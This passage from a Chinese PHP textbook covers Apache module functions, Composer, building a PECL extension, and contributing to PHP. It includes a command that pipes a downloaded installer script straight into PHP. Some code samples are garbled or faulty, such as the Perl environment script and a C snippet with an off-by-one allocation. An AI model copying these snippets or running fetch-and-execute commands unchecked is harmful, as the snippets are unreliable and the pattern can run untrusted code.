尽管 1 版本不是多线程的，且 2.x 版本曾颇具争议，但情况依然如此。（顺便一提，PHP 发明者 Rasmus Lerdorf 也是较为著名的批评者之一。）Apache 的主要优势之一是它可在多种平台上使用，因此可以通用。

PHP 的最初尝试也是在 Apache 下进行的。因此，PHP 的模块版在 Apache 下运行良好也并不奇怪。但这远非全部。PHP 专门为 Apache 服务器提供了许多特定函数，下面将简要介绍。

## 37.1 准备工作

当然，PHP 的 Apache 特定函数只有在 PHP 作为模块实际集成时才有意义；CGI 版本（作为外部程序）没有相应的权限。

![](img/ae7820c36e8f24c1623d26668b28e80e_945_0.png)

图 37.1 Apache 支持已启用

因此，必须如第 2 章所述将 PHP 作为模块安装。除此之外，不需要进一步的安装步骤。phpinfo() 的输出显示支持是否已启用（即是否将 PHP 用作 Apache 模块；参见图 37.1）。

## 37.2 应用示例

在本章中，我们将跳过介绍性说明，直接进入应用示例。原因是：PHP 的 Apache 函数唯一的共同点是，它们仅适用于 PHP 的 Apache 模块版本。但是，这些函数各自都有特定用途，应用示例即由此得出。

### 37.2.1 关于 Apache 的信息

首先，可以使用 PHP 本身来查找有关 Apache 安装的信息。这对于主机提供商来说可能很重要，例如，它们向客户提供的有关 Web 服务器配置的信息很少。

这里有两个函数特别值得关注：

- apache_get_modules() 以关联数组的形式返回所有已安装的 Apache 模块列表。
- apache_get_version() 确定所使用的 Apache 版本。

请参阅以下示例清单。输出如图 37.2 所示。

```
<html>
<head>
<title>Apache Info</title>
</head>
<body>
<b>You are using Apache
<?php
echo apache_get_version();
?>
with the following modules:</b>
<pre>
<?php
print_r(apache_get_modules());
?>
</pre>
</body>
</html>
```

清单 37.1 关于 Apache 安装的信息 ("info.php")

```
You are using Apache Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12 with the following modules:
Array
(
    [0] => core
    [1] => mod_win32
    [2] => mpm_winnt
    [3] => http_core
    [4] => mod_so
    [5] => mod_access_compat
    [6] => mod_actions
    [7] => mod_alias
    [8] => mod_allowmethods
    [9] => mod_asis
    [10] => mod_auth_basic
    [11] => mod_authn_core
    [12] => mod_authn_file
    [13] => mod_authz_core
    [14] => mod_authz_groupfile
    [15] => mod_authz_host
    [16] => mod_authz_user
    [17] => mod_autoindex
    [18] => mod_cgi
    [19] => mod_dav_lock
    [20] => mod_dir
    [21] => mod_env
    [22] => mod_headers
    [23] => mod_include
    [24] => mod_info
    [25] => mod_isapi
    [26] => mod_log_config
    [27] => mod_cache_disk
    [28] => mod_mime
    [29] => mod_negotiation
)
```

图 37.2 所有已安装的 Apache 模块

### 37.2.2 读取 HTTP 标头

$_SERVER 超全局数组包含许多环境和服务器变量，但并非全部。因此无法完全访问 HTTP 标头。但是，如果 PHP 集成到 Web 服务器中，则脚本语言足够接近 HTTP 请求和响应的“核心”，从而可以实现完全访问。

PHP 提供了 apache_request_headers() 和 apache_response_headers() 函数，可用于将请求和响应的 HTTP 标头确定为关联数组（参见清单 37.2）。图 37.3 中所示的一个标头由 PHP 生成；所有其他标头由 Apache 在 PHP 完成工作后生成。

```
<html>
<head>
<title>HTTP Headers</title>
</head>
<body>
<h1>Request</h1>
<pre>
<?php
print_r(apache_request_headers());
?>
</pre>
<h1>Response</h1>
<pre>
<?php
print_r(apache_response_headers());
?>
</pre>
</body>
</html>
```

清单 37.2 输出所有 HTTP 标头 ("header.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_948_0.png)

图 37.3 一目了然的所有标头

### 37.2.3 URI 信息

Web 浏览器会不断请求 URL 或 URI。但也有所谓的部分请求，其中仅确定资源的基本信息，例如 MIME 类型、缓存行为等。如果 PHP 作为 Apache 模块安装，则脚本语言可以查找同一 Web 服务器上文件的这些信息。其中，这使得可以将虚拟文件名（/folder/file.php）转换为实际的物理文件名（/home/httpd/htdocs/folder/file.php）。apache_lookup_uri() 确定这些信息并将其作为关联数组返回（参见图 37.4）：

```
<?php
$file = "";
if (isset($_GET["file"]) && is_string($_GET["file"])) {
    $file = $_GET["file"];
}
?>
<html>
<head>
<title>URI Info</title>
</head>
<body>
<?php
if ($file != "") {
?>
<h1>Information about <?php
echo htmlspecialchars($file);
?>
</h1>
<pre>
<?php
print_r(apache_lookup_uri($file));
?>
</pre>
<?php
}
?>
<form method="get" action="">
URI: <input type="text" name="file" value="<?php
echo htmlspecialchars($file);
?>" />
<input type="submit" value="Get URI info" />
</form>
</body>
</html>
```

清单 37.3 关于 URI 的信息 ("uri.php")





![](img/ae7820c36e8f24c1623d26668b28e80e_950_0.png)

图 37.4 URI 信息概览

### 37.2.4 集成其他服务器技术

如果要集成其他脚本，PHP 通常会使用以下一种结构：include、include_once、require 或 require_once。但是，如果以这种方式包含的文件不包含任何 PHP 或 HTML 代码，则此方法会失败。在日益异构化的世界中，主网站可能运行在 PHP 下，但其中的部分内容仍可能是用 Perl 或其他技术实现的。

此时，清单 37.4 提供了一个非常简单的示例。假设您“继承”了一个 Perl 网站，但想将其转换为 PHP。然而，有一个脚本您根本无法在 PHP 中重建，因此希望继续使用它。

```
#!/usr/local/bin/perl
##
## Output environment variables
##
print "Content-type: text/html\n\n";
foreach $value (sort(keys(%ENV)))
{
    $value = $ENV{$value}; #Get environment variable
    $value =~ s/|\n|\n|g; #Make breaks visible
$value =~ s/[\\\"]//g; #escape quotation marks
print "$\{$value\}=\"\\"${value}\\"<br />\\n";
}
```

## 清单 37.4 “复杂”的 Perl 示例（“environment.pl”）

Perl 专家一眼就能认出清单 37.4 中的代码：它是 Apache 网络服务器随附的脚本（*printenv.pl*）的稍作修改版本。该脚本除了输出所有环境变量外，不做其他任何事情。

现在应在 PHP 脚本中调用此代码。当然，您可以使用 fopen() 执行脚本并输出返回值。但是，让 Apache 来完成此操作的性能要高得多。

Apache 支持通过以下指令按虚拟路径包含文件：

```
<!--#include virtual="/cgi-bin/environment.pl"-->
```

不幸的是，PHP 无法处理此问题。但请不要绝望：通过 virtual() 方法，也可以用 PHP 模拟此行为，前提是 PHP 作为 Apache 模块安装。清单 37.5 显示了完整的示例，该示例假设 Perl 脚本位于 /cgi-bin/environment.pl 下，并且 Perl 已正确安装。

```
<html>
<head>
<title>Environment Variables</title>
</head>
<body>
<h1>Perl provides the following information:</h1>
<pre>
<?php
virtual("/cgi-bin/environment.pl");
?>
</body>
</html>
```

## 清单 37.5 通过 PHP 调用 Perl 脚本（“virtual.php”）

### 37.2.5 终止 Apache 进程

作为最后一个示例，这里有一个适用于高端应用程序的内容。如果您有一个非常占用资源的脚本，在使用 Apache 时，之后终止 Apache 进程是个好主意，以便尽快释放占用的宝贵资源。好消息是，您也可以用 PHP 实现这一点。调用 apache_child_terminate() 函数会终止 Apache 的当前子进程。请放心：这不会终止 Apache 本身，而只是终止众多进程中的一个。

> **注意**
> >
> > 仅当 `php.ini` 中的 `child_terminate` 开关已设置为 `On` 时，才可使用此指令。

# 第 38 章 Composer

*PHP 功能广泛，但如果没有外部库，通常就不那么有用了。*
*Composer 包和依赖管理器让使用变得轻松。*

使用用 PHP 编写的库时，一个常见问题是：如何安装它们？过去，这通常意味着查找并阅读文档，然后希望相关库也能在本地系统上运行。但是，对于大多数软件来说，这已成为过去式，因为 Composer 自 2012 年以来就已存在。这是由 Nils Adermann 和 Jordi Boggiano（以及许多其他开源爱好者）开发的程序，也可用于解决依赖项。它可以通过命令行安装许多 PHP 库，包括任何其他所需的包。本章将向您介绍基础知识。

## 38.1 安装 Composer

Composer 的主页是 https://getcomposer.org（参见图 38.1）。除了常规文档外，还有安装说明。过程因操作系统而异。

在带有 curl 的系统上（即默认情况下除了 Windows 之外的所有系统），以下命令会在系统上安装管理器：

```
curl -sS https://getcomposer.org/installer | php
```

当然，也可以从指定的 URL（https://getcomposer.org/installer）手动下载数据并让 PHP 执行它（php -f name-of-downloaded-file）。原则上，安装程序以下载 PHAR 格式¹ 的 Composer，并创建一个名为 composer 的可执行脚本，可用于运行包管理器。

¹ PHAR 代表 PHP 归档（PHP archive），本质上是一个包含 PHP 代码的归档文件。可以将其视为 PHP 可以执行的完整应用程序。

![](img/ae7820c36e8f24c1623d26668b28e80e_954_0.png)

图 38.1 Composer 主页

此过程在 Windows 下也可行，但更简单：有一个 Windows 安装程序位于 https://getcomposer.org/Composer-Setup.exe，它会加载最新版本的 Composer，并自动设置 PATH 环境变量，以便您可以直接从命令提示符调用 composer。安装程序会检查一些 PHP 设置，包括是否安装了 OpenSSL 扩展，这对于通过 HTTPS 下载数据是必需的。如果没有，则在需要时会自动调整 php.ini（参见图 38.2）。对于出厂状态下的 PHP 安装，当前的设置如下：

```
extension=openssl
extension=mbstring
```

在安装过程中，因此还会要求您指定要使用的 PHP 安装位置（如果系统中有多个并行版本，这很重要）。

安装后，无论操作系统如何，如果您可以在终端中运行 composer，则说明全局安装成功（参见图 38.3）。如果不行，请使用本地变体。为此，搜索 composer.phar 文件并尝试以下调用：

```
php composer.phar
```

![](img/ae7820c36e8f24c1623d26668b28e80e_955_0.png)

图 38.2 Composer 的 Windows 安装程序

![](img/ae7820c36e8f24c1623d26668b28e80e_955_1.png)

图 38.3 Composer 安装成功。

## 38.2 通过 Composer 安装包

这可能是使用 Composer 安装包的最快方法：

```
composer require "aws/aws-sdk-php"
```

这会安装 Amazon AWS 云平台的 PHP SDK 的最新版本。以下是更具体版本的示例：

- `"aws/aws-sdk-php=3.0.0"`
  - 确切版本 3.0.0
- `"aws/aws-sdk-php=3.0.*"`
  - 至少版本 3.0.0，低于 3.1.0 的版本
- `"aws/aws-sdk-php>=3.0.0"`
  - 至少版本 3.0.0
- `"aws/aws-sdk-php>3.0.0"`
  - 高于 3.0.0 的版本
- `"aws/aws-sdk-php<=3.0.0"`
  - 最多版本 3.0.0
- `"aws/aws-sdk-php<3.0.0"`
  - 低于 3.0.0 的版本
- `"aws/aws-sdk-php^3.0.0"`
  - 至少版本 3.0.0，低于版本 4.0.0（因为那里的 API 可能会更改；推荐用于依赖项）

可能版本的完整列表可在在线手册 http://spr.co/v602256 中找到。但回到安装：AWS SDK 使用几个额外组件。Composer 知道这一点并会自动安装它们。图 38.4 展示了设置的实际情况：在 SDK 之前会下载其他组件。

![](img/ae7820c36e8f24c1623d26668b28e80e_956_0.png)

图 38.4 通过 Composer 安装 AWS SDK——包括依赖项！

这样，您可以手动在系统上设置和安装组件。当然，如果能将项目所需的外部库和包信息存储在项目内部会更好。

可以使用配置文件实现这一点。它必须包含 composer.json，并使用 JSON 格式（如文件扩展名所示）。特别是，它包含所有必需的包——例如：

```
{
    "require": {
        "aws/aws-sdk-php": "^3.297"
    }
}
```

此配置文件对应于图 38.4 中的调用。要安装 composer.json 中的所有包，请在 JSON 文件所在的同一目录下使用以下调用：

```
composer install
```

如果查看项目文件夹（参见图 38.5），您会发现 Composer 具有一个标准结构。vendor 目录包含各个包。这种命名方案也有助于您查找库。

![](img/ae7820c36e8f24c1623d26668b28e80e_957_0.png)

图 38.5 Composer 创建的目录结构

当然，您使用 Composer 安装的包（或其依赖项！）总有一天会有更新。与其手动查找，不如让 Composer 来完成工作：

```
composer update
```





在 AWS SDK 的所选示例中，您可以看到 *vendor* 目录下有一个名为 *autoload.php* 的文件。这并非所选软件包的特殊功能，而是另一种约定。其内容如下所示：

```
<?php
// autoload.php @generated by Composer
require_once __DIR__ . '/composer/autoload_real.php';
return ComposerAutoloaderInit8e23d6bfcbe8ef837dbd00cd1b4981f7::getLoader();
```

按照此模式支持自动加载的所有软件包，都已由 Composer 相应地做好准备。在您的应用程序中，现在只需加载 *autoload.php* 文件，相应软件包的所有类即可直接供您使用。

只剩下（几乎）一个问题：Composer 究竟如何知道 *aws/aws-sdk-php* 软件包的代码位于何处？这个名称似乎是相当随意地选择的。答案是：通过 *Packagist*，即 Composer 的官方存储库（*https://packagist.org*）。公开可用的软件包都存储在那里，包括 AWS SDK 的软件包（参见图 38.6）。

![](img/ae7820c36e8f24c1623d26668b28e80e_958_0.png)

图 38.6 Packagist 上的所有 AWS 软件包

## 38.3 自定义适用于 Composer 的代码

如果您想自己编写 PHP 库并依赖 Composer 基础架构，则需要分两步进行：

- 1. 创建 composer.json 文件。
- 2. 在 https://packagist.org 上注册该软件包。

清单 38.1 显示了先前使用的 AWS SDK 的 composer.json 文件示例。（源代码可在 http://s-prs.co/v602257 上找到，截至 2024 年 1 月。）

```
{
    "name": "aws/aws-sdk-php",
    "homepage": "http://aws.amazon.com/sdkforphp",
    "description": "AWS SDK for PHP - Use Amazon Web Services in your PHP
project",
    "keywords": ["aws","amazon","sdk","s3","ec2","dynamodb","cloud","glacier"],
    "type": "library",
    "license": "Apache-2.0",
    "authors": [
        {
            "name": "Amazon Web Services",
            "homepage": "http://aws.amazon.com"
        }
    ],
    "support": {
        "forum": "https://forums.aws.amazon.com/forum.jspa?forumID=80",
        "issues": "https://github.com/aws/aws-sdk-php/issues"
    },
    "require": {
        "php": ">=7.2.5",
        "guzzlehttp/guzzle": "^6.5.8 || ^7.4.5",
        "guzzlehttp/promise": "^1.9.1 || ^2.4.5",
        "guzzlehttp/promises": "^1.4.0 || ^2.0",
        "mtdowling/jmespath.php": "^2.6",
        "ext-pcre": "*",
        "ext-json": "*",
        "ext-simplexml": "*",
        "aws/aws-crt-php": "^1.2.3",
        "psr/http-message": "^1.0 || ^2.0"
    },
    "require-dev": {
        "composer/composer": "^1.10.22",
        "ext-openssl": "*",
        "ext-dom": "*",
        "ext-pcntl": "*",
        "ext-sockets": "*",
        "phpunit/phpunit": "^5.6.3 || ^8.5 || ^9.5",
        "behat/behat": "~3.0",
        "doctrine/cache": "~1.4",
        "aws/aws-php-sns-message-validator": "~1.0",
        "nette/neon": "^2.3",
        "andrewsville/php-token-reflection": "^1.4",
        "psr/cache": "^1.0",
        "psr/simple-cache": "^1.0",
        "paragonie/random_compat": ">= 2",
        "sebastian/comparator": "^1.2.3 || ^4.0",
        "yoast/phpunit-polyfills": "^1.0",
        "dms/phpunit-arraysubset-asserts": "^0.4.0"
    },
    "suggest": {
        "ext-openssl": "Allows working with CloudFront private distributions
and verifying received SNS messages",
        "ext-curl": "To send requests using cURL",
        "ext-sockets": "To use client-side monitoring",
        "doctrine/cache": "To use the DoctrineCacheAdapter",
        "aws/aws-php-sns-message-validator": "To validate incoming SNS
notifications"
    },
    "autoload": {
        "psr-4": {
            "Aws\\": "src/"
        },
        "files": ["src/functions.php"]
    },
    "autoload-dev": {
        "psr-4": {
            "Aws\\Test\\": "tests/"
        },
        "classmap": ["build/"]
    },
    "extra": {
        "branch-alias": {
            "dev-master": "3.0-dev"
        }
    }
}
```

清单 38.1 “来自 AWS SDK for PHP 的 composer.json”

除了有关扩展的常规信息外，您还会找到依赖项列表，包括您在图 38.4 中已安装的软件包。suggest 部分还包含一些执行时不必要的推荐扩展。有关 composer.json 格式的详细文档，请参阅 http://s-prs.co/v602296。

JSON 文件准备就绪后，我们就基本完成了——前提是您的库位于公共存储库中，且该存储库不使用过于另类的版本管理系统，例如 Git、Subversion 或 Mercurial。只需在 https://packagist.org/packages/submit 处输入存储库 URL（参见图 38.7），Packagist 就会处理其余事宜。

由于本章仅浅显地介绍了 Composer，官方文档基本上是首选咨询对象。您可以在 https://getcomposer.org/doc 找到它。

![](img/ae7820c36e8f24c1623d26668b28e80e_961_0.png)

图 38.7 将软件包提交至 Packagist

# 第 39 章
PHP 扩展

当然，PHP 开发的至高无上的领域是开发 PHP 及其扩展。在本章中，我们将创建一个简单的 PHP 扩展，并在各种操作系统上对其进行测试。

PHP 是一种非常强大的语言；我们希望前面的图书章节已经证明了这一点。但是，总会有内置功能不足的地方。本章介绍 PECL。与 PEAR 一样，您可以将自己的（优秀）软件包贡献给 PECL。主要区别在于，这些软件包是用 C 编写的，因此必须进行编译。

> **注意**
> 
> 这就引出了一个问题：PHP 扩展和 PECL 软件包有什么区别？好吧，至少没有什么大区别。您使用 PECL 软件包就像使用 PHP 扩展一样，如第 39.3 节所示。
> 
> PECL 软件包通常比 PEAR 软件包更强大，因为经过编译，性能通常更高。但也存在缺点：它们需要编译版本，因此操作系统独立性面临风险。此外，各种主机反对提供许多扩展。因此，如果您希望自己的代码尽可能被更多用户使用，请首先查看 PEAR、Zend Framework 或其他库。

由于您需要为 PECL 学习一种完全不同的语言——即 C——因此我们将本章中的解释保持相对简短，只向您展示初步步骤是什么样子。因此，我们只会创建一个相当小的 PECL 扩展。C 编程的秘密和 Zend Engine 的内部机制有点超出了本书的重点。

> **注意**
> 
> 关于编写 PHP 扩展或 PECL 模块，有一句名言：“谈论的人一无所知；真正懂行的人不谈论它。”这句话来自我们的作者同事 George Schlossnagle。他确实了解，并且也谈论（或撰写）过这个主题。他的书 *Professional PHP 5 Programming* 目前在普通书店已无法购买，但在现代旧书店仍可找到，书中包含大量相关材料，是深入了解该主题的绝佳建议。不幸的是，自出版以来 PHP 内部发生了许多变化，许多细节已不再是最新的。

本章中的示例是我们在本书写作结束时创建的。我们在项目中投入了大量精力，在接近尾声时，我们思考这个过程是否可以优化。我们很快想到了一本书生成器的点子。您输入一个主题，完整的书籍即可生成。

## 39.1 编程

本书在许多地方都体现了一个原则：用尽可能少的工作（即 PHP 代码）完成尽可能多的事情。我们希望在本章中也保持这一原则。如果您确切知道扩展的名称以及它应提供哪些函数，就可以（几乎）自动生成完整代码。为此，PHP 源代码的 ext 目录中有一个名为 ext_skel.php 的脚本，它会自动创建相关 C 代码的基本框架（骨架）。1

以下调用必须直接在 PHP 源代码的 ext 文件夹中执行，并为扩展生成一系列数据（参见图 39.1）：

```
php ext_skel.php --ext book
```

![](img/ae7820c36e8f24c1623d26668b28e80e_964_0.png)

图 39.1 “ext_skel.php”运行示例

1 在 GitHub 上：http://s-prs.co/v602297。




但它可以（几乎）稍微容易一些，尽管并非完全没有隐患。Hartmut Holzgraefe 在（得到少数其他人的支持，包括 Rasmus Lerdorf）编写了一个 PEAR 包，可以做到这一点并提供额外选项。嗯，确切地说，它最初是一个 PEAR 包，然后在 PECL 中待了一段时间。现在它回到了 PEAR，这次以两个包的形式。基础包的主页可在 http://s-prs.co/v602298 找到；还需要来自 http://s-prs.co/v602299 的包（参见图 39.2）。

![](img/ae7820c36e8f24c1623d26668b28e80e_965_0.png)

图 39.2 不再积极维护，但仍然功能正常：“CodeGen_PECL”

你安装包的方式与往常一样，使用 `pear install CodeGen` 和 `pear install CodeGen_PECL`（参见图 39.3）。在执行此操作之前，建议——至少在首次使用 PEAR 时——更新频道列表：

```
pear update-channels
```

虽然你仍然需要用命令行参数调用 `ext_skel.php`，但 PECL_Gen 结构更清晰一些：你需要 XML 格式。以下是 XML 配置文件的最小版本：

```
<?xml version="1.0"?>
<extension name="Book">
</extension>
```

![](img/ae7820c36e8f24c1623d26668b28e80e_966_0.png)

图 39.3 PEAR 包的安装

这会创建一个名为 Book 的扩展，但没有任何其他信息。现在是时候改变这一点了。任何后续打印的 XML 代码都将位于 `<extension>` 元素内。首先，你需要简要说明扩展的功能。`<summary>` 元素用于此目的：

```
<summary>Book generator</summary>
```

然后，如同 PEAR 一样，你可以存储关于扩展作者的信息。在 PECL 中这相对不常见，因为这些信息也会出现在 `phpinfo()` 的输出中。但是，这对于培训目的肯定并不不切实际，并且可能对于可能的商业 PHP 扩展也有意义。此外，这些信息会填充 PECL 项目主页上的信息页面（参见图 39.2）：

```
<maintainers>
<maintainer>
<user>wnz</user>
<name>Christian Wenz</name>
<email>wnz@php.net</email>
<role>lead</role>
</maintainer>
</maintainers>
```

此外，定义文件中还应列出扩展的最后几个已发布版本，同样用于项目主页（以及 `phpinfo()`）：

```
<release>
<version>0.1.0</version>
<date>2024-01-24</date>
<state>alpha</state>
<notes>Little code, few features</notes>
</release>
```

现在我们来谈谈核心内容：代码。扩展要实现的每个函数都需要一个 `<function>` 元素。在 `<proto>` 子元素中，你指定函数的原型（即带参数和数据类型的签名）。你还有 `<description>`（描述，如需更详细）和 `<summary>`（摘要）字段：

```
<functions>
<function name="write">
<proto>string write(string topic)</proto>
<summary>Ghostwriter</summary>
<description>Creates a book. :-)</description>
<code></code>
</function>
</functions>
```

唯一缺少的是实际的 C 代码。有些出乎意料的是，你也在 XML 文件中指定它，位于 `<code>` 和 `</code>` 之间。以下是一段实际上会基于主题创建书籍的简短代码；它只是将 "topic Handbook" 作为字符串返回：

```
<code><![CDATA[
char *title;
title = (char *)emalloc(topic_len + 9);
*title = '\0';
strcat(title, topic);
strcat(title, " Handbook");
RETURN_STRINGL(title, topic_len + 9, 0);
]]></code>
</function>
</functions>
<maintainers>
<maintainer>
<user>wenz</user>
<name>Christian Wenz</name>
<email>wenz@php.net</email>
<role>lead</role>
</maintainer>
</maintainers>
<release>
<version>0.1.0</version>
<date>2024-01-24</date>
<state>alpha</state>
<notes>Little code, few features</notes>
</release>
<summary>Book generator</summary>
</extension>
```

清单 39.1 PECL_Gen 的 XML 定义文件（“extension.xml”)

现在你只需调用 PECL_Gen。安装后，相应脚本已存储在 PHP 目录中：

```
pecl-gen extension.xml
```

如果你使用 Windows，可以使用安装过程中创建的 pecl-gen.bat 批处理文件并执行相同的命令。可能出现的提示（参见图 39.4）可以作为例外忽略。然后该脚本会生成相关的 C 文件、测试等更多内容。图 39.5 显示了 ext_skel.php 生成的文件；PEAR 包的结果类似。

![](img/ae7820c36e8f24c1623d26668b28e80e_968_0.png)

图 39.4 "pecl-gen" 的输出

![](img/ae7820c36e8f24c1623d26668b28e80e_969_0.png)

图 39.5 生成的目录

原则上，通过 `ext_skel.php` 的流程要好得多，因为该脚本仍在积极维护。但无论你选择哪种方法，最终都会得到创建扩展所需的（几乎）一切内容。

## 39.2 编译

该脚本已自动创建一个以扩展命名的目录（这里是 `book`；`ext_skel.php` 会将大写字母转换为小写字母），并在其中创建了一些文件，包括以下文件：

- config.m4

除此之外，此文件为 PHP 设置了一个新的配置开关：

```
...
PHP_ARG_ENABLE([book],
[whether to enable book support],
[AS_HELP_STRING([--enable-book],
[Enable book support])],
[no])
...
```

### book.c

扩展的 C 源代码。如果你已使用过 PECL 包，这实际上已经就绪。如果你使用 ext_skel.php，则仍需在生成的文件中输入一些信息。碰巧的是，文件中已有两个测试函数 test1() 和 test2()。这些能为你自己的实验提供良好的灵感，并展示基本结构。尽管如此，请删除 PHP_FUNCTION 包围的两个块，并改为插入以下代码：

```
PHP_FUNCTION(write)
{
 char *topic = NULL;
 size_t topic_len = 0;
 zend_string *retval;

 ZEND_PARSE_PARAMETERS_START(1, 1)
 Z_PARAM_STRING(topic, topic_len)
 ZEND_PARSE_PARAMETERS_END();

 retval = strprintf(0, "%s Handbook", topic);

 RETURN_STR(retval);
}
```

此文件中的其他信息包括扩展在 phpinfo() 中的输出。

### book.stub.php

以下是扩展提供的函数列表。它们本质上直接以 PHP 代码形式指定签名！删除 test1() 和 test2() 的两个现有条目，并改为创建以下条目：

```
function write(string $topic = ""): string {}
```

### book_arginfo.h

此处（仅当使用 ext_skel.php 时）会找到所用参数的信息。它会根据 book.stub.php 中的信息自动生成。如果这不起作用，请使用以下模板：

```
/* This is a generated file, edit the .stub.php file instead.
 * Stub hash: 7eb3fd4083c98e6dffc8b02b6373b7ce9cbf228d */

 ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX(arginfo_write, 0, 0, IS_STRING, 0)
 ZEND_ARG_TYPE_INFO_WITH_DEFAULT_VALUE(0, topic, IS_STRING, 0, "\\""")
 ZEND_END_ARG_INFO()

 ZEND_FUNCTION(write);

 static const zend_function_entry ext_functions[] = {
 ZEND_FE(write, arginfo_write)
 ZEND_FE_END
};
```

使用 PEAR 包时，此信息可直接在 book.c 文件中找到。

- php_book.h

扩展的头文件。

在 tests 目录中还有一个扩展的单元测试模板，（当使用 PECL 包时）manual 文件夹中有相关文档的起点。由此可见，入门一点也不困难：恰恰相反。

现在你只需编译扩展。为此，请进入 PHP 源代码（php-src）的基础目录并执行随 PHP 安装的 phpize 脚本（Windows 用户，如第 2 章所述使用 buildconf）：

```
phpize
```

然后重新配置 PHP（Windows 用户，请使用 nmake 代替 make）：

```
./configure --enable-book
make
```

图 39.6 和图 39.7 说明了此过程。最后，除 Windows 外，请确保（使用 root 权限）扩展（Book.so）也位于正确的目录中：

```
make install
```

![](img/ae7820c36e8f24c1623d26668b28e80e_971_0.png)

图 39.6 使用 "--enable-book" 配置开关




![](img/ae7820c36e8f24c1623d26668b28e80e_972_0.png)

图 39.7 最终结果应呈现的样子

就这样了！该扩展功能并不算丰富，但创建起来也极其迅速，也不像乍看起来（或过去那样）那么困难。

> ### 在 Windows 上使用 PECL 包进行编译
> 
> 如果你已使用 CodeGen_PECL 生成扩展框架并且正在使用 Windows，请将生成的 _book_ 目录复制到 PHP 源代码的 _ext_ 目录中并重新编译 PHP。（创建配置文件时指定 `--enable-book` 开关。）
> 
> 然而，在较新的 PHP 版本中，这里会出问题——原因是不再维护的 CodeGen_PECL。因此，请手动调整 book.c 文件。大约在第 16 行包含以下内容：
> 
> ```
> function_entry book_functions[] = {
> ```
> 
> 你必须将其替换为：
> 
> ```
> zend_function_entry book_functions[] = {
> ```
> 
> 然后编译应该就能正常工作。

### 39.3 测试

取决于你是设置了 CodeGen_PECL 还是 _ext_skel.php_，现在有两种测试选项。

### 选项 1

扩展是直接创建的（php_Book.so 或 php_Book.dll），因此现在也要在 php.ini 中公开：

extension=book

调用 phpinfo() 现在会显示关于该类的信息（见图 39.8）。

![](img/ae7820c36e8f24c1623d26668b28e80e_973_0.png)

图 39.8 “phpinfo()” 输出中的我们的扩展

当然，你现在想测试扩展。由于你已将类包含在 php.ini 中，可以直接调用新的 write() 函数：

```
<?php
 echo write("PHP 8.3");
 ?>
```

清单 39.2 轻松编写图书（“book.php”）

图 39.9 显示了结果：脚本已为 PHP 8.3 创建了一本手册（或至少是标题）。

![](img/ae7820c36e8f24c1623d26668b28e80e_973_1.png)

图 39.9 关于 PHP 8.3 的书

### 选项 2

扩展已直接集成到 PHP 中。这意味着你不再需要通过 php.ini 加载扩展，而可以直接调用 write() 函数。这可以直接在命令行中测试：php -m 返回所有扩展的列表，而 php -r 执行代码（见图 39.10）。

![](img/ae7820c36e8f24c1623d26668b28e80e_974_0.png)

图 39.10 通过控制台测试扩展

你现在已经迈出了创建自己的 PHP 扩展的第一步。你可能已经对更有用的 PECL 模块有了想法。如果你的扩展不仅可以创建书名，还可以创建完整的书籍文本，请告诉我们。感谢购买这本（完全手敲）的书！

## 第 40 章

# 为 PHP 做贡献

*PHP 是开源的，因此源代码是公开的。在这方面，贡献代码（或任何其他东西）的门槛不再那么高了。*

PHP 项目的成功基于许多组成部分：语言的易访问性、基于 PHP 的库和应用的广泛生态系统、庞大的核心团队、庞大的社区。

虽然开源通常遵循 LOW 原则（*让别人工作*），但 PHP 是由开发者为开发者打造的语言。因此，自己为 PHP 项目做贡献的门槛并不高。当你自己为轮子贡献了一个小齿轮时，使用这种语言不是更有趣吗？

在本书的最后一章，我们将简要向你展示如何为 PHP 贡献代码，以及使用真实示例的其他贡献方式。

## 40.1 PHP 补丁

PHP 的开发和维护是公开进行的。代码使用 Git 作为版本管理系统；代码库在流行的 GitHub 平台上镜像（原始代码由 PHP 项目本身托管）。

在 GitHub 本身可以找到很好的概览：https://github.com/php 显示所有 PHP 项目（见图 40.1）。https://github.com/php/php-src 是最活跃的项目——即 PHP 本身。然而，拉取请求是通过 PHP 页面处理的。

> 从版本管理到版本管理
> PHP 并非一直通过 Git 管理。该项目过去曾依赖并发版本系统（CVS），自 2009 年起使用 Subversion（SVN）。转向 Git 最终发生在 2012 年。目前暂不计划再次切换。

自己为 PHP 贡献代码有两种方式：要么添加新功能，要么改进现有功能中的某些内容。先从较小的任务开始。

![](img/ae7820c36e8f24c1623d26668b28e80e_976_0.png)

图 40.1 GitHub 上的 PHP 项目

### 40.1.1 修复错误

为 PHP 贡献代码的最简单方式是修复一个错误，无论该错误是自己报告的，还是已经在 PHP 的错误跟踪器中找到条目。

无论起点如何，你始终需要一个已创建的错误。过去有一个单独的 Web 应用程序，即 PHP 错误跟踪系统，位于 https://bugs.php.net。如果你在那里搜索错误，会发现自 2023 年以来没有新错误被录入。取而代之的是现在使用 GitHub 基础设施。有两个主要仓库用于收集和提交问题：

- PHP 源代码：https://github.com/php/php-src/issues
- 文档页面：https://github.com/php/doc-en/issues

在所有已注册问题的概览页面上，还有一个标记为 New Issue 的按钮。它会导航到图 40.2 所示的输入掩码，你可以通过它报告错误。

然而，本节的重点不是实际报告错误，而是修复它。因此，你必须获取 PHP 代码（根据错误，特定 PHP 子版本的最新版本或最新代码），并相应地修复错误。我们自己的一个稍旧的示例非常适合演示目的，尤其是因为必要的代码更正相当简单。在此案例中，这些行的作者曾注意到，旧版本中 phpinfo() 的输出包含一个小错误：所使用的操作系统也始终会在那里输出。

![](img/ae7820c36e8f24c1623d26668b28e80e_977_0.png)

图 40.2 在 PHP 项目中报告错误

然而，在 Windows 8.1 下，输出是 Windows 8（这发生在 Windows 10 甚至 11 之前很久）。ext/standard/info.c 文件（实现 phpinfo() 函数的文件）被确定为罪魁祸首。内部 Windows 版本号和相应的输出文本是通过操作系统在那里确定的。你可以看到当时代码的一个缩短且稍作编辑的摘录：

```
if (VER_PLATFORM_WIN32_NT==osvi.dwPlatformId &&
    osvi.dwMajorVersion > 4 ) {
if (osvi.dwMajorVersion == 6) {
    if( osvi.dwMinorVersion == 0 ) {
        if( osvi.wProductType == VER_NT_WORKSTATION ) {
            major = "Windows Vista";
        } else {
            major = "Windows Server 2008";
        }
    } else
    if ( osvi.dwMinorVersion == 1 ) {
        if( osvi.wProductType == VER_NT_WORKSTATION ) {
            major = "Windows 7";
        } else {
            major = "Windows Server 2008 R2";
        }
    } else if ( osvi.dwMinorVersion == 2 ) {
